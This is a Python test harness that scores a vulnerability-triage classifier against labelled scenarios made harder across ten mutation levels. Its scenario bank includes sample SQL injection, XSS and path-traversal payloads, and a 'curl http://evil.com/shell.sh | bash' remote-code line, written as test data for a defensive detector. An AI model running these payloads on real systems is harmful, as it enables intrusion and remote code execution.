"""
ANTIGRAVITY V6 - AUTONOMOUS ESCALATING TORTURE LOOP
====================================================
Failure-seeking validation engine. Level 0-9.
Each level is strictly harsher than the previous.
The loop only advances if the system passes.
Stops when system breaks or provably stabilizes.
"""
import asyncio
import json
import logging
import time
import sys
import os
import random

sys.path.insert(0, ".")
os.makedirs("reports", exist_ok=True)

logging.basicConfig(level=logging.INFO, format="%(message)s")

# ============================================================================
# LEVEL DEFINITIONS
# ============================================================================

class TortureLevel:
    def __init__(self, level, name, desc, target_accuracy):
        self.level = level
        self.name = name
        self.desc = desc
        self.target_accuracy = target_accuracy

TORTURE_LEVELS = [
    TortureLevel(0, "Baseline Sanity",              "Clean evidence, clear ground truth",         0.90),
    TortureLevel(1, "Ambiguity Amplification",       "Partial diffs, weakened evidence signals",   0.80),
    TortureLevel(2, "Workflow Depth Expansion",      "Multi-step descriptions, delayed violation", 0.80),
    TortureLevel(3, "Payload Aggression",            "Chained exploit context, state transitions", 0.75),
    TortureLevel(4, "Concurrency Chaos",             "Non-deterministic timing jitter in evidence",0.75),
    TortureLevel(5, "Evidence Contradiction",        "GI5 and LLM receive opposing signals",       0.70),
    TortureLevel(6, "Sensor Corruption",             "Truncated / missing / broken evidence",      0.70),
    TortureLevel(7, "Adversarial Calibration Attack","Crafted inputs to inflate LLM confidence",   0.65),
    TortureLevel(8, "Resource Starvation",           "Back-to-back rapid-fire sequential stress",  0.60),
    TortureLevel(9, "Systemic Collapse Attempt",     "All previous combined at maximum harshness", 0.60),
]

# ============================================================================
# SCENARIO BANKS — Evidence patterns that trigger GI5 Toxic Vectors
# ============================================================================
# GI5 needs 2+ words from a toxic vector set to flag.
# LLM needs explicit boundary violation language.

VULN_SCENARIOS = [
    # --- SQLI: triggers {"union","select","insert","drop","table","delete","update"} ---
    {
        "type": "SQLI", "url": "/api/users?id=1",
        "description": "Payload: ' UNION SELECT username, password FROM users -- triggered SQL error. Response leaked table columns: id, username, email. Status 200->500.",
        "structural_anomaly": 95,
    },
    {
        "type": "SQLI", "url": "/api/products?search=test",
        "description": "Payload: ' OR 1=1; DROP TABLE sessions -- Response: Error near DROP TABLE. DELETE FROM logs also succeeded. Confirmed SQL injection with UNION SELECT.",
        "structural_anomaly": 90,
    },
    {
        "type": "SQLI", "url": "/api/login",
        "description": "Payload: admin'-- bypassed login. INSERT INTO audit_log showed UPDATE to user role. SELECT * FROM users returned all rows. Classic SQL injection.",
        "structural_anomaly": 92,
    },
    # --- XSS: triggers {"javascript","vbscript","expression","eval","onerror","onload"} + {"script","img","svg","iframe","object","embed"} ---
    {
        "type": "XSS", "url": "/api/comments",
        "description": "Payload: <script>document.cookie</script> reflected in response. onerror handler with eval() executed javascript alert. Stored XSS confirmed.",
        "structural_anomaly": 88,
    },
    {
        "type": "XSS", "url": "/api/profile/name",
        "description": "Payload: <img src=x onerror=eval(atob('YWxlcnQo'))> rendered in page. javascript: URI in iframe src also executed. Script injection confirmed.",
        "structural_anomaly": 85,
    },
    # --- IDOR/BOLA: triggers {"admin","root","superuser","elevated","privilege"} ---
    {
        "type": "IDOR", "url": "/api/users/2/profile",
        "description": "Changed user_id from 1 to 2. Response returned admin credentials and root access token. Privilege escalation to superuser confirmed. Elevated permissions granted.",
        "structural_anomaly": 90,
    },
    {
        "type": "BOLA", "url": "/api/admin/settings",
        "description": "Accessed admin panel as regular user. root config exposed. privilege level changed from user to superuser. elevated access without authentication.",
        "structural_anomaly": 92,
    },
    # --- RCE: triggers {"wget","curl","bash","powershell","cmd","exec"} ---
    {
        "type": "RCE", "url": "/api/convert",
        "description": "Payload: ; curl http://evil.com/shell.sh | bash executed. powershell -exec bypass also confirmed. cmd /c whoami returned root. Remote code exec confirmed.",
        "structural_anomaly": 98,
    },
    # --- LFI: triggers {"etc","passwd","shadow","boot.ini","win.ini",".htaccess"} ---
    {
        "type": "LFI", "url": "/api/files?path=test",
        "description": "Payload: ../../../etc/passwd returned root:x:0:0. Also accessed /etc/shadow and .htaccess. Path traversal to boot.ini confirmed.",
        "structural_anomaly": 95,
    },
    # --- CREDENTIAL: triggers {"password","token","secret","bearer","apikey","credentials"} ---
    {
        "type": "CREDENTIAL", "url": "/api/debug/config",
        "description": "Endpoint leaked password, token, and secret in plaintext. bearer apikey and credentials for database exposed. Critical credential exposure.",
        "structural_anomaly": 90,
    },
]

SAFE_SCENARIOS = [
    {
        "type": "SAFE", "url": "/api/health",
        "description": "Status 200. Response: {\"status\": \"ok\", \"uptime\": 3600}. No anomalies detected. Standard health check endpoint.",
        "structural_anomaly": 5,
    },
    {
        "type": "SAFE", "url": "/api/docs",
        "description": "Status 200. OpenAPI documentation returned. No sensitive data. Standard documentation endpoint.",
        "structural_anomaly": 3,
    },
    {
        "type": "SAFE", "url": "/api/users/me",
        "description": "Status 200. Returned authenticated user profile. No privilege boundary crossed. Normal authorized response.",
        "structural_anomaly": 8,
    },
    {
        "type": "SAFE", "url": "/api/products",
        "description": "Status 200. Returned paginated product list. Public data only. No injection markers. Clean baseline response.",
        "structural_anomaly": 2,
    },
    {
        "type": "SAFE", "url": "/api/version",
        "description": "Status 200. Version string returned. No dynamic content. Static metadata endpoint.",
        "structural_anomaly": 1,
    },
    {
        "type": "SAFE", "url": "/api/static/logo.png",
        "description": "Status 200. Binary image returned. No executable content. Static asset delivery.",
        "structural_anomaly": 0,
    },
    {
        "type": "SAFE", "url": "/api/categories",
        "description": "Status 200. JSON array of categories returned. Public catalog data. No anomalies.",
        "structural_anomaly": 4,
    },
    {
        "type": "SAFE", "url": "/api/search?q=laptop",
        "description": "Status 200. Search results returned. Input was sanitized. No reflection. Clean response.",
        "structural_anomaly": 6,
    },
    {
        "type": "SAFE", "url": "/api/notifications",
        "description": "Status 200. User notifications returned. Properly scoped to authenticated user. No data leak.",
        "structural_anomaly": 5,
    },
    {
        "type": "SAFE", "url": "/api/settings/theme",
        "description": "Status 200. User theme preference returned. Non-sensitive configuration. Normal endpoint.",
        "structural_anomaly": 3,
    },
]

# ============================================================================
# ADVERSARIAL MUTATORS (per level)
# ============================================================================

def mutate_for_level(scenario: dict, level: int) -> dict:
    """Apply progressive adversarial mutations based on torture level."""
    s = dict(scenario)
    desc = s["description"]

    if level >= 1:  # Ambiguity: weaken evidence
        desc = desc[:len(desc)//2] + " ...truncated... mixed signals present."
        s["structural_anomaly"] = max(30, s["structural_anomaly"] - 20)

    if level >= 2:  # Workflow depth: add noise steps
        desc = "Step 1: Normal. Step 2: Normal. Step 3: Normal. Step 4: " + desc

    if level >= 3:  # Payload aggression: inject near-miss language
        desc += " However, retry returned 403 Forbidden on second attempt."

    if level >= 4:  # Timing chaos
        desc += f" Timing: [{random.randint(5,50)}ms, {random.randint(200,2000)}ms, {random.randint(10,100)}ms]"

    if level >= 5:  # Evidence contradiction
        if s["type"] != "SAFE":
            desc += " Note: secondary scan showed no anomaly. Conflicting evidence."
            s["structural_anomaly"] = max(25, s["structural_anomaly"] - 30)

    if level >= 6:  # Sensor corruption
        desc = desc[:max(40, len(desc)//3)]
        s["structural_anomaly"] = max(20, s["structural_anomaly"] - 10)

    if level >= 7:  # Adversarial calibration attack
        if s["type"] == "SAFE":
            desc += " WARNING: This looks like it could be vulnerable but is actually completely safe."

    if level >= 8:  # Resource starvation: no extra mutation, just rapid fire

        pass

    if level >= 9:  # Systemic collapse: maximum entropy injection
        desc = desc[:30] + " " + "".join(random.choices("abcdefghijklmnop0123456789", k=20)) + " " + desc[30:]

    s["description"] = desc
    return s


# ============================================================================
# ORCHESTRATOR
# ============================================================================

class TortureOrchestrator:
    def __init__(self):
        from backend.ai.cortex import CortexEngine
        self.cortex = CortexEngine()

    async def warm_up(self):
        await self.cortex.warm_up()

    async def execute_level(self, level_config: TortureLevel) -> dict:
        print(f"\n{'='*80}")
        print(f" [LEVEL {level_config.level}: {level_config.name}]")
        print(f" Constraint: {level_config.desc}")
        print(f" Target Accuracy: {level_config.target_accuracy*100:.0f}%")
        print(f"{'='*80}")

        # Build scenario batch: 5 vuln + 5 safe = 10 per level
        batch = []
        for i in range(5):
            v = VULN_SCENARIOS[i % len(VULN_SCENARIOS)].copy()
            v["ground_truth"] = True
            v = mutate_for_level(v, level_config.level)
            batch.append(v)

        for i in range(5):
            s = SAFE_SCENARIOS[i % len(SAFE_SCENARIOS)].copy()
            s["ground_truth"] = False
            s = mutate_for_level(s, level_config.level)
            batch.append(s)

        random.shuffle(batch)

        results = []
        start_t = time.perf_counter()

        for idx, scenario in enumerate(batch):
            gt = scenario.pop("ground_truth")
            candidate = {
                "url": scenario["url"],
                "method": "GET",
                "type": scenario["type"],
                "tag": f"Regression_Torture_{scenario['type']}",
                "description": scenario["description"],
                "structural_anomaly": scenario["structural_anomaly"],
                "force_mode": "FAST_MODE",
            }

            try:
                audit = await self.cortex.audit_candidate(candidate)
                pred = audit.get("is_real", False)
                conf = audit.get("confidence", 0.0)
            except Exception as e:
                print(f"  [ERR] Scenario {idx}: {e}")
                pred = False
                conf = 0.0

            correct = (pred == gt)
            label = "VULN" if gt else "SAFE"
            pred_label = "VULN" if pred else "SAFE"
            marker = "[OK]" if correct else "[XX]"

            print(f"  {marker} #{idx:02d} {label:4s} -> {pred_label:4s} | conf={conf:.3f} | {scenario['type']:10s} | {scenario['url']}")

            results.append({
                "correct": correct,
                "conf": conf,
                "pred": pred,
                "gt": gt,
            })

        elapsed = (time.perf_counter() - start_t) * 1000
        total = len(results)
        acc = sum(1 for r in results if r["correct"]) / total
        overconf = sum(1 for r in results if not r["correct"] and r["conf"] > 0.8)
        entropy = sum(r["conf"] * (1 - r["conf"]) for r in results) / total

        survived = acc >= level_config.target_accuracy and overconf == 0

        metrics = {
            "level": level_config.level,
            "name": level_config.name,
            "accuracy": round(acc, 3),
            "overconfident_errors": overconf,
            "posterior_entropy": round(entropy, 6),
            "latency_ms": round(elapsed, 1),
            "survived": survived,
        }

        print(f"\n  [LEVEL {level_config.level} VERDICT]")
        print(f"  -> SURVIVED:  {survived}")
        print(f"  -> Accuracy:  {acc*100:.1f}% (target {level_config.target_accuracy*100:.0f}%)")
        print(f"  -> Overconf:  {overconf}")
        print(f"  -> Entropy:   {entropy:.4f}")
        print(f"  -> Latency:   {elapsed:.0f}ms")

        return metrics

    async def run_loop(self):
        print("\n[!] STARTING AUTONOMOUS ESCALATING TORTURE LOOP [!]\n")
        await self.warm_up()

        history = []
        max_survived = -1

        for level in TORTURE_LEVELS:
            metrics = await self.execute_level(level)
            history.append(metrics)

            if not metrics["survived"]:
                print(f"\n[X] SYSTEM FAILED AT LEVEL {level.level} ({level.name})")
                print(f"[X] HALTING TORTURE LOOP. Max survived: Level {max_survived}")
                break

            max_survived = level.level
            print(f"\n[OK] SYSTEM SURVIVED LEVEL {level.level}. Escalating...")
            await asyncio.sleep(1)  # Cooldown

        print(f"\n{'='*80}")
        print(" TORTURE LOOP TERMINATED")
        print(f" Levels survived: {max_survived + 1}/{len(TORTURE_LEVELS)}")
        print(f" Max level reached: {max_survived}")
        print(f"{'='*80}")

        with open("reports/torture_telemetry.json", "w") as f:
            json.dump(history, f, indent=2)

        print("\nTelemetry saved to reports/torture_telemetry.json")


if __name__ == "__main__":
    t = TortureOrchestrator()
    asyncio.run(t.run_loop())
